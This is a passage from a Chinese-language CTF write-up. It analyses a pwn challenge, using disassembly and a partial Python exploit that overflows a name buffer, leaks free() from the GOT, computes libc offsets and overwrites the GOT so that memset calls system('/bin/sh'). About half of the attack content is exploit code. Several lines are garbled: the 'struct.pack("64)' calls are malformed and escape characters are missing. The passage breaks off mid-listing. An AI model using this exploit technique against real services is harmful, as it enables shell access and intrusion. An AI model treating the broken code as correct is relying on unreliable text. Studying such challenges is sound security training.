    .text:0000000000400EC4     call    _memcpy                     ; overflow!
    .text:0000000000400EC9     mov     rax, [rbp+s]
    .text:0000000000400ECD     mov     rdi, rax                    ; ptr
    .text:0000000000400ED0     call    _free
听起来还是不错的,但是这里还有一个坑,就是我们在覆写 got 表的时候,此时的 [rbp+s] 所指向的内存的字符串的不是以 /bin/shx00
开始的,而是要覆盖 free 函数指针的值.因此如果直接将 got表中 free函数的值覆盖为 system函数的地址,并不能执行
system("/bin/sh") 也就不能 pwn成功.所以要想实现 getshell ,
我们需要做的是找到一个函数的调用点,他的第一个参数指向的内存区域的内容我们可控,这样我们就能通过函数 覆写 got 表来使得调用他时实际调用的函数为
system,然后执行 system("/bin/sh") 搞定它.经过查找找到了一个
    .text:0000000000400A33                 mov     edx, 200h       ; n
    .text:0000000000400A38                 mov     esi, 0          ; c
    .text:0000000000400A3D                 mov     edi, offset buf_512 ; s
    .text:0000000000400A42                 call    _memset
    .bss:0000000000602100 ; char buf_512[512]
    .bss:0000000000602100 buf_512         db 200h dup(?)          ; DATA XREF: main+30o
    .bss:0000000000602100                                         ; main+44o ...
    .bss:0000000000602300 score           dd ?                    ; DATA XREF: main+4Ew
    .bss:0000000000602300
在main 函数中调用 memset 函数时它的第一个参数为指向 .bss 段的一个未初始化的内存,又由于之前我们已经能对got实现写入 最大
0xf8字节的数据.所以我们可以从 got表的 free 函数开始写 ,一直写到.bss:0000000000602100 ; char
buf_512[512] 并且把got 表中memset函数的地址设为system函数的地址.实现漏洞的利用.由于覆盖整个 got
表,其他函数的地址也会被修改,所以我还需要针对got的修改实现一条 调用链,确保能正常的执行到main函数中的memset,然后就能getshell
啦.具体的利用过程,结合大牛写的exp来分析.就拿一些关键的点出来分析,其他的请自行结合exp分析.
第一步溢出 name ,修改 obj 偏移8处的地址.
    # -------------------------------------------------------------------------        # first overflow: Arbitrary read
        # -------------------------------------------------------------------------        ovfl  = "A" * 128                               # fill name
        ovfl += struct.pack("64) 
        ovfl += struct.pack("64) 
        ovfl += struct.pack("<L", 0x128)                # name length
        ovfl += struct.pack("<Q", 0x0000000000602018)   # address of .got.free()
        s.send( ovfl + "n")
        r = recv_until("Continue? ")
        # print list(r)
        off  = r.find("Highest player: ") + len("Highest player: ")
        free = struct.unpack("<Q", r[off:off + 8])[0] & 0x0000ffffffffffff
        print "[+] Leaking address of free(): ", hex(free)
        '''
        Offsets from my libc:
            1349: 000000000003f510    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
            2230: 0000000000078890   146 FUNC    GLOBAL DEFAULT   13 free@@GLIBC_2.2.5
            2116: 0000000000020610   458 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
            844:  00000000000817c0    65 IFUNC   GLOBAL DEFAULT   13 memset@@GLIBC_2.2.5
            1880: 0000000000067dd0   518 FUNC    WEAK   DEFAULT   13 setvbuf@@GLIBC_2.2.5
        '''
        system     = free - (0x78890 - 0x3f510)
        libc_start = free - (0x78890 - 0x20610)
        memset     = free + (0x78890 - 0x817c0)
        setvbuf    = free - (0x78890 - 0x67dd0)
        '''
        Offsets from libc-2.23.so:
            1351: 0000000000045380    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5+